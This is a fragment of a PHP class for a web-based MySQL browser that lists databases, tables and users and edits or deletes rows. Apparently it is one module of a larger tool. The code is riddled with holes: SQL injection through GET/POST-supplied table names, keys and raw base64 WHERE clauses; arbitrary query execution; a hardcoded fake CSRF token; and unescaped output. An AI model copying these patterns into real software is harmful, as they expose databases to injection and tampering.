    function viewDB(){
        $db = $this->getdbs();
        $output = "<fieldset>";
        $output .= "<legend>Databases (".count($db).")</legend>";
        if(is_array($db)){
             foreach($db as $key =>$val){
                 $class = " class='ajax' update='left' blank='right'";
                 if($val === $this->dbname){
                     $output .= "<i><b>{$val}</b></i><br>";
                 }else{
                     $output .= "<a href='". $this->url(base64_encode($val)) ."&method=database' {$class}>{$val}</a><br>";
                 }
             }
        }else{
             $output .= "<i>No Databases</i>";
        }
        $output .= "</fieldset>";
        $output .= "<br>";

        return $output;
    }

    // table specific, gets information to be built by a view function
    function getTables($reload = 0){
        if($reload){
            unset($this->tbl);
        }
        if(empty($this->tbl)){
            if($_GET['db']){
                $res = $this->query("SHOW TABLES FROM " . $this->dbname);
                if($res){
		            while($row = mysql_fetch_assoc($res)){
		                $arr[] = $row['Tables_in_' . $this->dbname];
		            }
                }
                $this->tbl = $arr;
                return $this->getReturn($arr);
            }
        }else{
            return $this->getReturn($this->tbl);
        }
    }

       // list all tables user has access to
    function viewTables($reload = 0){

        $tbl = $this->getTables($reload);

        $output = "<fieldset>";
        $output .= "<legend>Tables (".count($tbl).")</legend>";
        $output .= "<table>";

        if(is_array($tbl)){
            foreach($tbl as $key =>$val){
                $this->query("SELECT * FROM ". $val);
                $rows = mysql_num_rows($this->results);
                $val = htmlentities($val);
                $output .= "<tr>";
                $output .= "<td>";
                $output .= "<a  href='" . $this->url() ."method=ajax&tbl=".base64_encode($val)."&view=1' update='right' alt='{$rows} Rows' title='{$rows} Rows' class=\"ajax\">{$val}</a>";
                $output .= "</td>";
                $output .= "</tr>\r";
            }
        }else{
        	$output .= "<i>No Tables</i>";
        }
        $output .= "</table>";
        $output .= "</fieldset>";
        $output .= "<br>";

        return $output;
    }

    function tblStruct($tbl){
        if(!$this->validTbl($tbl)) return false;

        $this->query("DESCRIBE {$tbl}");
        while($row = mysql_fetch_assoc($this->results)){
            $arr[] = $row;
        }
        return $this->getReturn($arr);
    }

     function get_all_users(){
        return $this->dbinfo;
    }

    function view_all_users(){
        $users = $this->get_all_users();
        $count = 0;
        $output = "<fieldset>";
        $output .= "<legend>Users (".count($users).")</legend>";
		if(is_array($users)){
		    foreach($users as $arr){
		        $class = " class='ajax' update='left' blank='right'";
		        $user = $arr['user'];
		        if($count == $this->current){
		            $output .= "<i><b>{$user}</b></i><br>";
		        }else{
		            $output .= "<a href='". $this->url() ."&method=database&current={$count}' {$class}>{$user}</a><br>";
		        }
		        $count++;
		    }
        }else{
        	$output .= "<i>No Users</i>";
        	$output .= var_dump($users);
        }
        $output .= "</fieldset>";
        $output .= "<br>";

        return $output;
    }


    // view is for viewing all contents of tables, default setting
    function viewAll($tbl,$start,$end){
        if(!$this->validTbl($tbl)) return false;

        $query = "SELECT * FROM " . $tbl . $this->limit;

        $start = (is_numeric($start) ? $start : "0");
        $end = (is_numeric($end) ? $end : "0");

        $tbl = $this->escape($tbl);

        $tableFields = $this->tblStruct($tbl);

        $table = $this->viewQuery($query);

        $table .= "<a href='". $this->url() ."tbl=".base64_encode($tbl)."&edit=0&method=ajax' class='ajax' update='right'>Add Record</a>";
        $table .= "<table id='view'>";
        $table .= "<tr>";
        $table .= "<th>Options</th>";
        foreach($tableFields as $key => $val){
            $fields[] = $val['Field'];
            $table .= "<th>{$val['Field']}</th>";
        }
        $table .= "</tr>";
        $keys = $this->fetch("SELECT k.column_name
                                    FROM information_schema.table_constraints t
                                    JOIN information_schema.key_column_usage k
                                    USING ( constraint_name, table_schema, table_name )
                                    WHERE t.constraint_type = 'PRIMARY KEY'
                                    AND t.table_schema = '{$this->dbname}'
                                    AND t.table_name = '{$tbl}'");
        if($this->numRows() > 0){
            $primary = base64_encode($keys['column_name']);
        }
        $this->query($query);
        $count = 0;
        while($row = mysql_fetch_assoc($this->results)){
            $count++;
            $table .= "<tr>";
            foreach($fields as $key=>$val){
                if($val === $keys['column_name']){
                    $_id = base64_encode($row[$val]);
                }
                if(strlen($row[$val]) > 20){
                    $string = substr($row[$val],0,20) . "...";
                }else{
                    $string = $row[$val];
                }
                $html .="<td>{$string}</td>";

            }
            if(!isset($_id)){
                $_id = base64_encode($count);
            }
            $table .= "<td><a href='". $this->url() ."tbl=".base64_encode($tbl)."&edit={$_id}&primary={$primary}&method=ajax' class='ajax' update='right'>Edit</a>";
            $table .= " | <a href='". $this->url() ."tbl=".base64_encode($tbl)."&delete={$_id}&primary={$primary}&method=ajax' class='ajax' update='right'>Delete</a></td>";
            $table .= $html;
            $table .= "</tr>";
            unset($_id);
            unset($html);
        }

        $table .= "</table>";

        return $table;
    }

     // view is for viewing contents of tables from queries
    function view($query,$start,$end){
        $query = base64_decode($query);
        $this->display($query);

        $tbl = explode("from",strtolower($query));
        $tbl = explode("where",strtolower($tbl['1']));
        $tbl = trim($tbl['0']);

        if(!$this->validTbl($tbl)) return false;

        $start = (is_numeric($start) ? $start : "0");
        $end = (is_numeric($end) ? $end : "0");

        $tableFields = $this->tblStruct($tbl);

        $this->query($query);



        $table .= "<a href='". $this->url() ."tbl=".base64_encode($tbl)."&edit=0&method=ajax' class='ajax' update='right'>Add Record</a>";
        $table .= "<table id='view'>";
        $table .= "<tr>";
        if(is_array($tableFields)){
            foreach($tableFields as $key => $val){
                $fields[] = $val['Field'];
                $table .= "<th>{$val['Field']}</th>";
            }
        }
        $table .= "<th>Tools</th>";
        $table .= "</tr>";
        $key = $this->fetch("SELECT k.column_name as key
                                    FROM information_schema.table_constraints t
                                    JOIN information_schema.key_column_usage k
                                    USING(constraint_name,table_schema,table_name)
                                    WHERE t.constraint_type='PRIMARY KEY'
                                      AND t.table_schema='{$this->dbname}'
                                      AND t.table_name='{$tbl}';");
        $table = $this->viewQuery($query);
        while($row = mysql_fetch_assoc($this->results)){

            $table .= "<tr>";
            foreach($fields as $key=>$val){
                if(strlen($row[$val]) > 20){
                    $string = substr($row[$val],0,20) . "...";
                }else{
                    $string = $row[$val];
                }
                $table .="<td>{$string}</td>";
            }
            $table .= "<td><a href='". $this->url() ."tbl=".base64_encode($tbl)."&edit={$key['key']}&method=ajax' class='ajax' update='right'>Edit</a> | <a href='#'>Delete</a></td>";
            $table .= "</tr>";
        }

        $table .= "</table>";

        return $table;
    }

    // textarea with query in it at top
    function viewQuery($query = ""){

        if(!$query){
            $query = $this->queries[count($this->queries)]["query"];
        }

        $output = $this->formstart();
        $output .= "<input type='submit' name='submit'>";
        $output .= "<textarea id='query' name='query'>{$query}</textarea><br>";
        $output .= $this->formEnd();
        return $output;
    }

    # Primary display function
    function viewDisplay($get){

        $this->load();

        if($this->noWorkie){
         return "No Database Users to connect with";
        }

        if(empty($get['method'])) $get['method'] = '';

            $output .= '<div id="wrapper">';
            $output .= '<table>';
            $output .= '<tr>';
            $output .= '<td>';

            switch($get['method']){
                case '':
                case 'database':
                    $output .= '<div id="left">';
                        $output .= $this->view_all_users();
                        $output .= $this->viewDB();
                        $output .= $this->viewTables();
                    $output .= '</div>';
                break;
                break;
                case 'ajax';
                break;
            }
            $output .= "</td><td valign='top' align='left'>";
            $output .= '<div id="right">&nbsp;';
                if(isset($get['view'])){
                    $start = ($get['start'] ? $get['start'] : "0");
                    $end = ($get['end'] ? $get['end'] : "0");
                    $output .= $this->viewAll(base64_decode($get['tbl']),$start,$end);
                }
                if(isset($get['query'])){
                    $start = ($get['start'] ? $get['start'] : "0");
                    $end = ($get['end'] ? $get['end'] : "0");
                    $output .= $this->view($get['query'],$start,$end);
                }
                if((isset($get['edit']))||(isset($get['delete']))){
                    $action = ($get['edit'] ? "edit" : "delete");
                    $output .= $this->$action(base64_decode($get['tbl']),base64_decode(($get['edit'] ? $get['edit'] : $get['delete'])),base64_decode($get['primary']));
                }
            $output .= '</div>';
            $output .= '</td>';
            $output .= '</tr>';
            $output .= '</table>';
            $output .= '</div>';

        print $output;
    }

    // controlling base href for entire script
    function url($dbname = 0){
        if(!$dbname){
            $dbname = base64_encode($this->dbname);
        }
        $baseURL = /*$this->file . */"?m=mysql&db={$dbname}&current={$this->current}&";
        return $baseURL;
    }

    // adding and editing functions for any table
    function edit($tbl, $id = 0, $key){
        $fields = $this->tblStruct($tbl);

        $action = "tbl=".base64_encode($tbl)."&edit=".base64_encode($id)."&primary=".base64_encode($key)."&method=ajax";

        if(($id)&&($key)){
            $value = $this->fetch("SELECT * FROM {$tbl} WHERE {$key} = '{$id}'");
            $primary = $key;
            $sql = "";
        }else if(($id)&&(!$key)){
            $low = $id - 1;
            $high = 1;
            $value = $this->fetch("SELECT * FROM {$tbl} LIMIT {$low}, {$high}");
            foreach($value as $key => $val){
                $sql .= $this->escape($key)." = '".$this->escape($val)."', ";
            }
            $sql = substr($sql, 0, (strlen($sql)-2));
            $primary = "";
        }

        $output = $this->viewQuery();

        # This POST section is completely independent from this function, yet it remains....
        if(isset($_POST['_submit'])){
            if(strstr($_POST['_submit'], "Insert")){
                $sqlBase = "INSERT INTO {$tbl} SET ";
                $sqlEnd = "";
            }else{
                $sqlBase = "UPDATE {$tbl} SET ";
                $_id = $id;
                $_sql = base64_decode($_POST['_sql']);
                $primary = $this->escape(base64_decode($_POST['_primary']));
                if($_POST['_sql']){
                    $sqlEnd = " WHERE {$_sql}";
                }else{
                    $sqlEnd = " WHERE {$key} = '{$_id}'";
                }
            }

            unset($_POST['_csrf']);
            unset($_POST['_submit']);
            unset($_POST['_id']);
            unset($_POST['_sql']);
            unset($_POST['_primary']);
            unset($primary);

            foreach($_POST as $key => $val){
                $sql .= $this->escape($key)." = '".$this->escape($val)."', ";
            }
            $sql = substr($sql, 0, (strlen($sql)-2));

            $sqlBase .= $sql . $sqlEnd;
            $this->query($sqlBase);
            $output .= "Query Ran: {$sqlBase}";
        }
        # Brad is a Bastard.
        # Will he ever see this message? If he doesn't, how will he know?

        $output .= $this->formStart("POST",$action);
        $output .= "<table class='edit'>";

        foreach($fields as $key => $val){
            $output .= "<tr>";
                $output .= "<td>{$val['Field']}</td>";
                $output .= "<td>{$val['Type']}</td>";
                $output .= "<td>". $this->formInput($val['Type'], $val['Field'], $value[$val['Field']]) ."</td>";
            $output .= "</tr>";
        }

        $output .= "<tr>";
            $output .= "<td colspan='3'>". $this->formInput("submit", "_submit",($id ? "Update" : "Insert") . " Record");
            $output .= $this->formInput("hidden", "_id", base64_encode($_id));
            $output .= $this->formInput("hidden", "_primary", base64_encode($key));
            $output .= $this->formInput("hidden", "_sql", base64_encode($sql));
            $output .= "</td>";
        $output .= "</tr>";
        $output .= "</table>";
        $output .= $this->formEnd;

        return $output;
    }

    function delete($tbl, $id = 0, $key){
        $fields = $this->tblStruct($tbl);

        $action = "tbl=".base64_encode($tbl)."&delete=".base64_encode($id)."&primary=".base64_encode($key)."&method=ajax";

        if(($id)&&($key)){
            $value = $this->fetch("SELECT * FROM {$tbl} WHERE {$key} = '{$id}'");
            $primary = $key;
            $sql = "";
        }else if(($id)&&(!$key)){
            $low = $id - 1;
            $high = 1;
            $value = $this->fetch("SELECT * FROM {$tbl} LIMIT {$low}, {$high}");
            foreach($value as $key => $val){
                $sql .= $this->escape($key)." = '".$this->escape($val)."', ";
            }
            $sql = substr($sql, 0, (strlen($sql)-2));
            $primary = "";
        }

        $output = $this->viewQuery();

        # This POST section is completely independent from this function, yet it remains....
        if(isset($_POST['_submit'])){
            if(strstr($_POST['_submit'], "Delete")){
                $sqlBase = "DELETE FROM {$tbl} ";
                $_id = $id;
                $_sql = base64_decode($_POST['_sql']);
                $primary = $this->escape(base64_decode($_POST['_primary']));
                if($_POST['_sql']){
                    $sqlEnd = " WHERE {$_sql}";
                }else{
                    $sqlEnd = " WHERE {$key} = '{$_id}'";
                }
            }

            unset($_POST['_csrf']);
            unset($_POST['_submit']);
            unset($_POST['_id']);
            unset($_POST['_sql']);
            unset($_POST['_primary']);
            unset($primary);

            foreach($_POST as $key => $val){
                $sql .= $this->escape($key)." = '".$this->escape($val)."', ";
            }
            $sql = substr($sql, 0, (strlen($sql)-2));

            $sqlBase .= $sql . $sqlEnd;
            $this->query($sqlBase);
            $output .= "Query Ran: {$sqlBase}";
        }

        $output .= $this->formStart("POST",$action);
        $output .= "<table class='edit'>";

        foreach($fields as $key => $val){
            $output .= "<tr>";
                $output .= "<td>{$val['Field']}</td>";
                $output .= "<td>{$val['Type']}</td>";
                $output .= "<td>{$value[$val['Field']]}</td>";
            $output .= "</tr>";
        }

        $output .= "<tr>";
            $output .= "<td colspan='3'>". $this->formInput("submit", "_submit","Confirm Deletion of Record");
            $output .= $this->formInput("hidden", "_id", base64_encode($_id));
            $output .= $this->formInput("hidden", "_primary", base64_encode($key));
            $output .= $this->formInput("hidden", "_sql", base64_encode($sql));
            $output .= "</td>";
        $output .= "</tr>";
        $output .= "</table>";
        $output .= $this->formEnd;

        return $output;
    }

    // form functions
    function formStart($method = "GET", $action = ""){
        $output = "<form action='". $this->url() ."{$action}' method='{$method}' id='mysql-form'>";
        $output .= "<input type='hidden' name='_csrf' value='".urlencode('Why am I not alphanumeric and randomized!!')."'>";

        return $output;
    }

    function formEnd(){
        $output = "</form>";
        return $output;
    }

    function formInput($type, $name, $value = ""){
        switch($type){
            case 'submit' :
                $form = "<input type='submit' name='{$name}' class='input' value='{$value}'>";
            break;

            case 'hidden' :
                $form = "<input type='hidden' name='{$name}' class='input' value='{$value}'>";
            break;

            case 'text' :
                $form = "<textarea name='{$name}' class='input'>{$value}</textarea>";
            break;

            default:
                $form = "<input type='text' name='{$name}' class='input' value='{$value}'>";
            break;
        }

        return $form;
    }
}
